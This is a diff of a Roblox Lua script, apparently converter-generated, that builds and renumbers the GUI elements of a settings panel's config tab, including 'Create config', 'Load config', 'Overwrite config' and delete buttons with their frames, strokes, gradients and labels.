+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.buttonFrame
+G2L["88"] = Instance.new("Frame", G2L["86"]);
+G2L["88"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["88"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["88"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["88"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["88"]["Name"] = [[buttonFrame]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.buttonFrame.outlineStroke
+G2L["89"] = Instance.new("UIStroke", G2L["88"]);
+G2L["89"]["Thickness"] = 2;
+G2L["89"]["Name"] = [[outlineStroke]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.buttonFrame.buttonFade
+G2L["8a"] = Instance.new("CanvasGroup", G2L["88"]);
+G2L["8a"]["BorderSizePixel"] = 0;
+G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8a"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8a"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["8a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8a"]["Name"] = [[buttonFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.buttonFrame.buttonFade.UIGradient
+G2L["8b"] = Instance.new("UIGradient", G2L["8a"]);
+G2L["8b"]["Rotation"] = 90;
+G2L["8b"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.text
+G2L["8c"] = Instance.new("TextLabel", G2L["86"]);
+G2L["8c"]["ZIndex"] = 2;
+G2L["8c"]["BorderSizePixel"] = 0;
+G2L["8c"]["TextSize"] = 14;
+G2L["8c"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["8c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8c"]["BackgroundTransparency"] = 1;
+G2L["8c"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["8c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8c"]["Text"] = [[Create config]];
+G2L["8c"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.text.text
+G2L["8d"] = Instance.new("UIStroke", G2L["8c"]);
+G2L["8d"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.fillbar
+G2L["8e"] = Instance.new("Frame", G2L["85"]);
+G2L["8e"]["ZIndex"] = 90;
+G2L["8e"]["BorderSizePixel"] = 0;
+G2L["8e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8e"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["8e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8e"]["Name"] = [[fillbar]];
+G2L["8e"]["BackgroundTransparency"] = 0.95;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---
+G2L["8f"] = Instance.new("Frame", G2L["6c"]);
+G2L["8f"]["BorderSizePixel"] = 0;
+G2L["8f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8f"]["Size"] = UDim2.new(1, 0, 0, 10);
+G2L["8f"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["8f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8f"]["Name"] = [[---DIVIDER---]];
+G2L["8f"]["LayoutOrder"] = 5;
+G2L["8f"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame
+G2L["90"] = Instance.new("Frame", G2L["8f"]);
+G2L["90"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["90"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["90"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["90"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["90"]["Name"] = [[dividerFrame]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame.outlineStroke
+G2L["91"] = Instance.new("UIStroke", G2L["90"]);
+G2L["91"]["Thickness"] = 2;
+G2L["91"]["Name"] = [[outlineStroke]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame.buttonFade
+G2L["92"] = Instance.new("CanvasGroup", G2L["90"]);
+G2L["92"]["BorderSizePixel"] = 0;
+G2L["92"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["92"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["92"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["92"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["92"]["Name"] = [[buttonFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
+G2L["93"] = Instance.new("UIGradient", G2L["92"]);
+G2L["93"]["Rotation"] = 90;
+G2L["93"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame.UIStroke
-G2L["66"] = Instance.new("UIStroke", G2L["62"]);
-G2L["66"]["Color"] = Color3.fromRGB(51, 51, 51);
-G2L["66"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
+G2L["94"] = Instance.new("UIStroke", G2L["90"]);
+G2L["94"]["Color"] = Color3.fromRGB(51, 51, 51);
+G2L["94"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame.UICorner
-G2L["67"] = Instance.new("UICorner", G2L["62"]);
+G2L["95"] = Instance.new("UICorner", G2L["90"]);
 
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.UIPadding
-G2L["68"] = Instance.new("UIPadding", G2L["61"]);
-G2L["68"]["PaddingTop"] = UDim.new(0, 3);
-G2L["68"]["PaddingRight"] = UDim.new(0, 6);
-G2L["68"]["PaddingLeft"] = UDim.new(0, 6);
-G2L["68"]["PaddingBottom"] = UDim.new(0, 3);
+G2L["96"] = Instance.new("UIPadding", G2L["8f"]);
+G2L["96"]["PaddingTop"] = UDim.new(0, 3);
+G2L["96"]["PaddingRight"] = UDim.new(0, 6);
+G2L["96"]["PaddingLeft"] = UDim.new(0, 6);
+G2L["96"]["PaddingBottom"] = UDim.new(0, 3);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load
-G2L["69"] = Instance.new("Frame", G2L["3e"]);
-G2L["69"]["BorderSizePixel"] = 0;
-G2L["69"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["69"]["Size"] = UDim2.new(1, 0, 0, 23);
-G2L["69"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["69"]["Name"] = [[load]];
-G2L["69"]["LayoutOrder"] = 8;
-G2L["69"]["BackgroundTransparency"] = 1;
+G2L["97"] = Instance.new("Frame", G2L["6c"]);
+G2L["97"]["BorderSizePixel"] = 0;
+G2L["97"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["97"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["97"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["97"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["97"]["Name"] = [[load]];
+G2L["97"]["LayoutOrder"] = 8;
+G2L["97"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button
-G2L["6a"] = Instance.new("TextButton", G2L["69"]);
-G2L["6a"]["BorderSizePixel"] = 0;
-G2L["6a"]["TextTransparency"] = 1;
-G2L["6a"]["TextSize"] = 14;
-G2L["6a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["6a"]["ZIndex"] = 49;
-G2L["6a"]["BackgroundTransparency"] = 1;
-G2L["6a"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["6a"]["Name"] = [[button]];
+G2L["98"] = Instance.new("TextButton", G2L["97"]);
+G2L["98"]["BorderSizePixel"] = 0;
+G2L["98"]["TextTransparency"] = 1;
+G2L["98"]["TextSize"] = 14;
+G2L["98"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["98"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["98"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["98"]["ZIndex"] = 49;
+G2L["98"]["BackgroundTransparency"] = 1;
+G2L["98"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["98"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["98"]["Name"] = [[button]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button.UIPadding
-G2L["6b"] = Instance.new("UIPadding", G2L["6a"]);
-G2L["6b"]["PaddingTop"] = UDim.new(0, 2);
-G2L["6b"]["PaddingRight"] = UDim.new(0, 3);
-G2L["6b"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["6b"]["PaddingBottom"] = UDim.new(0, 2);
+G2L["99"] = Instance.new("UIPadding", G2L["98"]);
+G2L["99"]["PaddingTop"] = UDim.new(0, 2);
+G2L["99"]["PaddingRight"] = UDim.new(0, 3);
+G2L["99"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["99"]["PaddingBottom"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button.buttonFrame
-G2L["6c"] = Instance.new("Frame", G2L["6a"]);
-G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["6c"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["6c"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["6c"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["6c"]["Name"] = [[buttonFrame]];
+G2L["9a"] = Instance.new("Frame", G2L["98"]);
+G2L["9a"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["9a"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["9a"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["9a"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["9a"]["Name"] = [[buttonFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button.buttonFrame.outlineStroke
-G2L["6d"] = Instance.new("UIStroke", G2L["6c"]);
-G2L["6d"]["Thickness"] = 2;
-G2L["6d"]["Name"] = [[outlineStroke]];
+G2L["9b"] = Instance.new("UIStroke", G2L["9a"]);
+G2L["9b"]["Thickness"] = 2;
+G2L["9b"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button.buttonFrame.buttonFade
-G2L["6e"] = Instance.new("CanvasGroup", G2L["6c"]);
-G2L["6e"]["BorderSizePixel"] = 0;
-G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["6e"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["6e"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["6e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["6e"]["Name"] = [[buttonFade]];
+G2L["9c"] = Instance.new("CanvasGroup", G2L["9a"]);
+G2L["9c"]["BorderSizePixel"] = 0;
+G2L["9c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9c"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["9c"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["9c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["9c"]["Name"] = [[buttonFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button.buttonFrame.buttonFade.UIGradient
-G2L["6f"] = Instance.new("UIGradient", G2L["6e"]);
-G2L["6f"]["Rotation"] = 90;
-G2L["6f"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["9d"] = Instance.new("UIGradient", G2L["9c"]);
+G2L["9d"]["Rotation"] = 90;
+G2L["9d"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button.text
-G2L["70"] = Instance.new("TextLabel", G2L["6a"]);
-G2L["70"]["ZIndex"] = 2;
-G2L["70"]["BorderSizePixel"] = 0;
-G2L["70"]["TextSize"] = 14;
-G2L["70"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["70"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["70"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["70"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["70"]["BackgroundTransparency"] = 1;
-G2L["70"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["70"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["70"]["Text"] = [[Load config]];
-G2L["70"]["Name"] = [[text]];
+G2L["9e"] = Instance.new("TextLabel", G2L["98"]);
+G2L["9e"]["ZIndex"] = 2;
+G2L["9e"]["BorderSizePixel"] = 0;
+G2L["9e"]["TextSize"] = 14;
+G2L["9e"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["9e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9e"]["BackgroundTransparency"] = 1;
+G2L["9e"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["9e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["9e"]["Text"] = [[Load config]];
+G2L["9e"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button.text.text
-G2L["71"] = Instance.new("UIStroke", G2L["70"]);
-G2L["71"]["Name"] = [[text]];
+G2L["9f"] = Instance.new("UIStroke", G2L["9e"]);
+G2L["9f"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.fillbar
-G2L["72"] = Instance.new("Frame", G2L["69"]);
-G2L["72"]["ZIndex"] = 90;
-G2L["72"]["BorderSizePixel"] = 0;
-G2L["72"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["72"]["Size"] = UDim2.new(0, 0, 1, 0);
-G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["72"]["Name"] = [[fillbar]];
-G2L["72"]["BackgroundTransparency"] = 0.95;
+G2L["a0"] = Instance.new("Frame", G2L["97"]);
+G2L["a0"]["ZIndex"] = 90;
+G2L["a0"]["BorderSizePixel"] = 0;
+G2L["a0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a0"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a0"]["Name"] = [[fillbar]];
+G2L["a0"]["BackgroundTransparency"] = 0.95;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite
-G2L["73"] = Instance.new("Frame", G2L["3e"]);
-G2L["73"]["BorderSizePixel"] = 0;
-G2L["73"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["73"]["Size"] = UDim2.new(1, 0, 0, 23);
-G2L["73"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["73"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["73"]["Name"] = [[overwrite]];
-G2L["73"]["LayoutOrder"] = 8;
-G2L["73"]["BackgroundTransparency"] = 1;
+G2L["a1"] = Instance.new("Frame", G2L["6c"]);
+G2L["a1"]["BorderSizePixel"] = 0;
+G2L["a1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a1"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["a1"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a1"]["Name"] = [[overwrite]];
+G2L["a1"]["LayoutOrder"] = 8;
+G2L["a1"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button
-G2L["74"] = Instance.new("TextButton", G2L["73"]);
-G2L["74"]["BorderSizePixel"] = 0;
-G2L["74"]["TextTransparency"] = 1;
-G2L["74"]["TextSize"] = 14;
-G2L["74"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["74"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["74"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["74"]["ZIndex"] = 49;
-G2L["74"]["BackgroundTransparency"] = 1;
-G2L["74"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["74"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["74"]["Name"] = [[button]];
+G2L["a2"] = Instance.new("TextButton", G2L["a1"]);
+G2L["a2"]["BorderSizePixel"] = 0;
+G2L["a2"]["TextTransparency"] = 1;
+G2L["a2"]["TextSize"] = 14;
+G2L["a2"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a2"]["ZIndex"] = 49;
+G2L["a2"]["BackgroundTransparency"] = 1;
+G2L["a2"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a2"]["Name"] = [[button]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button.UIPadding
-G2L["75"] = Instance.new("UIPadding", G2L["74"]);
-G2L["75"]["PaddingTop"] = UDim.new(0, 2);
-G2L["75"]["PaddingRight"] = UDim.new(0, 3);
-G2L["75"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["75"]["PaddingBottom"] = UDim.new(0, 2);
+G2L["a3"] = Instance.new("UIPadding", G2L["a2"]);
+G2L["a3"]["PaddingTop"] = UDim.new(0, 2);
+G2L["a3"]["PaddingRight"] = UDim.new(0, 3);
+G2L["a3"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["a3"]["PaddingBottom"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button.buttonFrame
-G2L["76"] = Instance.new("Frame", G2L["74"]);
-G2L["76"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["76"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["76"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["76"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["76"]["Name"] = [[buttonFrame]];
+G2L["a4"] = Instance.new("Frame", G2L["a2"]);
+G2L["a4"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["a4"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["a4"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["a4"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["a4"]["Name"] = [[buttonFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button.buttonFrame.outlineStroke
-G2L["77"] = Instance.new("UIStroke", G2L["76"]);
-G2L["77"]["Thickness"] = 2;
-G2L["77"]["Name"] = [[outlineStroke]];
+G2L["a5"] = Instance.new("UIStroke", G2L["a4"]);
+G2L["a5"]["Thickness"] = 2;
+G2L["a5"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button.buttonFrame.buttonFade
-G2L["78"] = Instance.new("CanvasGroup", G2L["76"]);
-G2L["78"]["BorderSizePixel"] = 0;
-G2L["78"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["78"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["78"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["78"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["78"]["Name"] = [[buttonFade]];
+G2L["a6"] = Instance.new("CanvasGroup", G2L["a4"]);
+G2L["a6"]["BorderSizePixel"] = 0;
+G2L["a6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a6"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a6"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["a6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a6"]["Name"] = [[buttonFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button.buttonFrame.buttonFade.UIGradient
-G2L["79"] = Instance.new("UIGradient", G2L["78"]);
-G2L["79"]["Rotation"] = 90;
-G2L["79"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["a7"] = Instance.new("UIGradient", G2L["a6"]);
+G2L["a7"]["Rotation"] = 90;
+G2L["a7"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button.text
-G2L["7a"] = Instance.new("TextLabel", G2L["74"]);
-G2L["7a"]["ZIndex"] = 2;
-G2L["7a"]["BorderSizePixel"] = 0;
-G2L["7a"]["TextSize"] = 14;
-G2L["7a"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["7a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["7a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["7a"]["BackgroundTransparency"] = 1;
-G2L["7a"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["7a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["7a"]["Text"] = [[Overwrite config]];
-G2L["7a"]["Name"] = [[text]];
+G2L["a8"] = Instance.new("TextLabel", G2L["a2"]);
+G2L["a8"]["ZIndex"] = 2;
+G2L["a8"]["BorderSizePixel"] = 0;
+G2L["a8"]["TextSize"] = 14;
+G2L["a8"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a8"]["BackgroundTransparency"] = 1;
+G2L["a8"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["a8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a8"]["Text"] = [[Overwrite config]];
+G2L["a8"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button.text.text
-G2L["7b"] = Instance.new("UIStroke", G2L["7a"]);
-G2L["7b"]["Name"] = [[text]];
+G2L["a9"] = Instance.new("UIStroke", G2L["a8"]);
+G2L["a9"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.fillbar
-G2L["7c"] = Instance.new("Frame", G2L["73"]);
-G2L["7c"]["ZIndex"] = 90;
-G2L["7c"]["BorderSizePixel"] = 0;
-G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["7c"]["Size"] = UDim2.new(0, 0, 1, 0);
-G2L["7c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["7c"]["Name"] = [[fillbar]];
-G2L["7c"]["BackgroundTransparency"] = 0.95;
+G2L["aa"] = Instance.new("Frame", G2L["a1"]);
+G2L["aa"]["ZIndex"] = 90;
+G2L["aa"]["BorderSizePixel"] = 0;
+G2L["aa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["aa"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["aa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["aa"]["Name"] = [[fillbar]];
+G2L["aa"]["BackgroundTransparency"] = 0.95;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete
-G2L["7d"] = Instance.new("Frame", G2L["3e"]);
-G2L["7d"]["BorderSizePixel"] = 0;
-G2L["7d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["7d"]["Size"] = UDim2.new(1, 0, 0, 23);
-G2L["7d"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["7d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["7d"]["Name"] = [[delete]];
-G2L["7d"]["LayoutOrder"] = 8;
-G2L["7d"]["BackgroundTransparency"] = 1;
+G2L["ab"] = Instance.new("Frame", G2L["6c"]);
+G2L["ab"]["BorderSizePixel"] = 0;
+G2L["ab"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ab"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["ab"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["ab"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ab"]["Name"] = [[delete]];
+G2L["ab"]["LayoutOrder"] = 8;
+G2L["ab"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button
-G2L["7e"] = Instance.new("TextButton", G2L["7d"]);
-G2L["7e"]["BorderSizePixel"] = 0;
-G2L["7e"]["TextTransparency"] = 1;
-G2L["7e"]["TextSize"] = 14;
-G2L["7e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["7e"]["ZIndex"] = 49;
-G2L["7e"]["BackgroundTransparency"] = 1;
-G2L["7e"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["7e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["7e"]["Name"] = [[button]];
